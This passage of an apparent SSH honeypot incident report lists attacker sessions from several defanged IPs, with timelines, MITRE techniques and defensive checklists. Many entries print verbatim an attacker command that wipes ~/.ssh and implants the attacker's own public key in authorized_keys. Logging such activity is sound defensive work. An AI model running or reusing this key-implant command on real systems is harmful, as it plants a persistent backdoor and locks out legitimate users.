| `2026-04-22 04:40:26` | `cowrie.command.input` |
| `2026-04-22 04:40:26` | `cowrie.command.failed` |
| `2026-04-22 04:40:27` | `cowrie.log.closed` |
| `2026-04-22 04:40:27` | `cowrie.session.params` |
| `2026-04-22 04:40:27` | `cowrie.command.input` |
| `2026-04-22 04:40:27` | `cowrie.session.file_download` |
| `2026-04-22 04:40:27` | `cowrie.log.closed` |
| `2026-04-22 04:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea78a9f47f5

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:40 |
| **Last Seen** | 2026-04-22 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:40:30` | `cowrie.session.connect` |
| `2026-04-22 04:40:30` | `cowrie.client.version` |
| `2026-04-22 04:40:30` | `cowrie.client.kex` |
| `2026-04-22 04:40:31` | `cowrie.login.success` |
| `2026-04-22 04:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad53faf42867

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:41 |
| **Last Seen** | 2026-04-22 04:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:41:29` | `cowrie.session.connect` |
| `2026-04-22 04:41:29` | `cowrie.client.version` |
| `2026-04-22 04:41:29` | `cowrie.client.kex` |
| `2026-04-22 04:41:29` | `cowrie.login.success` |
| `2026-04-22 04:41:30` | `cowrie.session.params` |
| `2026-04-22 04:41:30` | `cowrie.command.input` |
| `2026-04-22 04:41:30` | `cowrie.command.failed` |
| `2026-04-22 04:41:30` | `cowrie.log.closed` |
| `2026-04-22 04:41:30` | `cowrie.session.params` |
| `2026-04-22 04:41:30` | `cowrie.command.input` |
| `2026-04-22 04:41:30` | `cowrie.session.file_download` |
| `2026-04-22 04:41:30` | `cowrie.log.closed` |
| `2026-04-22 04:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-430db857112b

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:41 |
| **Last Seen** | 2026-04-22 04:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:41:32` | `cowrie.session.connect` |
| `2026-04-22 04:41:32` | `cowrie.client.version` |
| `2026-04-22 04:41:32` | `cowrie.client.kex` |
| `2026-04-22 04:41:32` | `cowrie.login.success` |
| `2026-04-22 04:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-616dd6dd8a43

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:42 |
| **Last Seen** | 2026-04-22 04:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:42:15` | `cowrie.session.connect` |
| `2026-04-22 04:42:15` | `cowrie.client.version` |
| `2026-04-22 04:42:15` | `cowrie.client.kex` |
| `2026-04-22 04:42:16` | `cowrie.login.success` |
| `2026-04-22 04:42:16` | `cowrie.session.params` |
| `2026-04-22 04:42:16` | `cowrie.command.input` |
| `2026-04-22 04:42:16` | `cowrie.command.failed` |
| `2026-04-22 04:42:17` | `cowrie.log.closed` |
| `2026-04-22 04:42:17` | `cowrie.session.params` |
| `2026-04-22 04:42:17` | `cowrie.command.input` |
| `2026-04-22 04:42:17` | `cowrie.session.file_download` |
| `2026-04-22 04:42:17` | `cowrie.log.closed` |
| `2026-04-22 04:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cdd11ef0b67

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:42 |
| **Last Seen** | 2026-04-22 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:42:20` | `cowrie.session.connect` |
| `2026-04-22 04:42:20` | `cowrie.client.version` |
| `2026-04-22 04:42:20` | `cowrie.client.kex` |
| `2026-04-22 04:42:21` | `cowrie.login.success` |
| `2026-04-22 04:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-965cbcaeed02

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:44 |
| **Last Seen** | 2026-04-22 04:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:44:01` | `cowrie.session.connect` |
| `2026-04-22 04:44:01` | `cowrie.client.version` |
| `2026-04-22 04:44:01` | `cowrie.client.kex` |
| `2026-04-22 04:44:02` | `cowrie.login.success` |
| `2026-04-22 04:44:02` | `cowrie.session.params` |
| `2026-04-22 04:44:02` | `cowrie.command.input` |
| `2026-04-22 04:44:02` | `cowrie.command.failed` |
| `2026-04-22 04:44:02` | `cowrie.log.closed` |
| `2026-04-22 04:44:02` | `cowrie.session.params` |
| `2026-04-22 04:44:02` | `cowrie.command.input` |
| `2026-04-22 04:44:02` | `cowrie.session.file_download` |
| `2026-04-22 04:44:02` | `cowrie.log.closed` |
| `2026-04-22 04:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c09f45486d9

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:44 |
| **Last Seen** | 2026-04-22 04:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:44:04` | `cowrie.session.connect` |
| `2026-04-22 04:44:04` | `cowrie.client.version` |
| `2026-04-22 04:44:04` | `cowrie.client.kex` |
| `2026-04-22 04:44:04` | `cowrie.login.success` |
| `2026-04-22 04:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2557c02e61d9

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:46 |
| **Last Seen** | 2026-04-22 04:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:46:02` | `cowrie.session.connect` |
| `2026-04-22 04:46:02` | `cowrie.client.version` |
| `2026-04-22 04:46:02` | `cowrie.client.kex` |
| `2026-04-22 04:46:03` | `cowrie.login.success` |
| `2026-04-22 04:46:03` | `cowrie.session.params` |
| `2026-04-22 04:46:03` | `cowrie.command.input` |
| `2026-04-22 04:46:03` | `cowrie.command.failed` |
| `2026-04-22 04:46:03` | `cowrie.log.closed` |
| `2026-04-22 04:46:03` | `cowrie.session.params` |
| `2026-04-22 04:46:03` | `cowrie.command.input` |
| `2026-04-22 04:46:03` | `cowrie.session.file_download` |
| `2026-04-22 04:46:03` | `cowrie.log.closed` |
| `2026-04-22 04:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82c4ca20bbdb

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:46 |
| **Last Seen** | 2026-04-22 04:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:46:05` | `cowrie.session.connect` |
| `2026-04-22 04:46:05` | `cowrie.client.version` |
| `2026-04-22 04:46:06` | `cowrie.client.kex` |
| `2026-04-22 04:46:06` | `cowrie.login.success` |
| `2026-04-22 04:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcacce4187ef

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:46 |
| **Last Seen** | 2026-04-22 04:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:46:46` | `cowrie.session.connect` |
| `2026-04-22 04:46:46` | `cowrie.client.version` |
| `2026-04-22 04:46:46` | `cowrie.client.kex` |
| `2026-04-22 04:46:46` | `cowrie.login.success` |
| `2026-04-22 04:46:46` | `cowrie.session.params` |
| `2026-04-22 04:46:46` | `cowrie.command.input` |
| `2026-04-22 04:46:46` | `cowrie.command.failed` |
| `2026-04-22 04:46:47` | `cowrie.log.closed` |
| `2026-04-22 04:46:47` | `cowrie.session.params` |
| `2026-04-22 04:46:47` | `cowrie.command.input` |
| `2026-04-22 04:46:47` | `cowrie.session.file_download` |
| `2026-04-22 04:46:47` | `cowrie.log.closed` |
| `2026-04-22 04:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cf267c168e6

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:46 |
| **Last Seen** | 2026-04-22 04:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:46:49` | `cowrie.session.connect` |
| `2026-04-22 04:46:49` | `cowrie.client.version` |
| `2026-04-22 04:46:49` | `cowrie.client.kex` |
| `2026-04-22 04:46:50` | `cowrie.login.success` |
| `2026-04-22 04:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3670b9bebb89

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:47 |
| **Last Seen** | 2026-04-22 04:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:47:26` | `cowrie.session.connect` |
| `2026-04-22 04:47:26` | `cowrie.client.version` |
| `2026-04-22 04:47:27` | `cowrie.client.kex` |
| `2026-04-22 04:47:27` | `cowrie.login.success` |
| `2026-04-22 04:47:28` | `cowrie.session.params` |
| `2026-04-22 04:47:28` | `cowrie.command.input` |
| `2026-04-22 04:47:28` | `cowrie.command.failed` |
| `2026-04-22 04:47:28` | `cowrie.log.closed` |
| `2026-04-22 04:47:29` | `cowrie.session.params` |
| `2026-04-22 04:47:29` | `cowrie.command.input` |
| `2026-04-22 04:47:29` | `cowrie.session.file_download` |
| `2026-04-22 04:47:29` | `cowrie.log.closed` |
| `2026-04-22 04:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ddf4b57f8b

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:47 |
| **Last Seen** | 2026-04-22 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:47:30` | `cowrie.session.connect` |
| `2026-04-22 04:47:30` | `cowrie.client.version` |
| `2026-04-22 04:47:30` | `cowrie.client.kex` |
| `2026-04-22 04:47:31` | `cowrie.login.success` |
| `2026-04-22 04:47:31` | `cowrie.session.params` |
| `2026-04-22 04:47:31` | `cowrie.command.input` |
| `2026-04-22 04:47:31` | `cowrie.command.failed` |
| `2026-04-22 04:47:31` | `cowrie.log.closed` |
| `2026-04-22 04:47:32` | `cowrie.session.params` |
| `2026-04-22 04:47:32` | `cowrie.command.input` |
| `2026-04-22 04:47:32` | `cowrie.session.file_download` |
| `2026-04-22 04:47:32` | `cowrie.log.closed` |
| `2026-04-22 04:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d777b1526680

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:47 |
| **Last Seen** | 2026-04-22 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:47:32` | `cowrie.session.connect` |
| `2026-04-22 04:47:32` | `cowrie.client.version` |
| `2026-04-22 04:47:32` | `cowrie.client.kex` |
| `2026-04-22 04:47:33` | `cowrie.login.success` |
| `2026-04-22 04:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35209ae2854f

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:47 |
| **Last Seen** | 2026-04-22 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:47:34` | `cowrie.session.connect` |
| `2026-04-22 04:47:34` | `cowrie.client.version` |
| `2026-04-22 04:47:34` | `cowrie.client.kex` |
| `2026-04-22 04:47:35` | `cowrie.login.success` |
| `2026-04-22 04:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a04d755ec3

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:48 |
| **Last Seen** | 2026-04-22 04:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:48:15` | `cowrie.session.connect` |
| `2026-04-22 04:48:15` | `cowrie.client.version` |
| `2026-04-22 04:48:15` | `cowrie.client.kex` |
| `2026-04-22 04:48:15` | `cowrie.login.success` |
| `2026-04-22 04:48:15` | `cowrie.session.params` |
| `2026-04-22 04:48:15` | `cowrie.command.input` |
| `2026-04-22 04:48:15` | `cowrie.command.failed` |
| `2026-04-22 04:48:15` | `cowrie.log.closed` |
| `2026-04-22 04:48:16` | `cowrie.session.params` |
| `2026-04-22 04:48:16` | `cowrie.command.input` |
| `2026-04-22 04:48:16` | `cowrie.session.file_download` |
| `2026-04-22 04:48:16` | `cowrie.log.closed` |
| `2026-04-22 04:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bd6d34f9240

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:48 |
| **Last Seen** | 2026-04-22 04:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
